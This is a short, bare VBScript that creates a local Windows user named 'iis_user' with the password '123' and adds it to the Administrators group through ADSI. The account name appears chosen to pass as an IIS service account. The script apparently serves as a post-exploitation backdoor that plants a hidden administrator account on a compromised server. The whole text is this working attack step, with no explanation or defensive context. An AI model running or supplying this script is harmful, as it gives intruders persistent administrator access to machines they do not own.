set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os)
Set oe=GetObject(os&"/Administrators,group")
Set od=ob.Create("user","iis_user")
od.SetPassword "123"
od.SetInfo
Set of=GetObject(os&"/iis_user",user)
oe.add os&"/iis_user"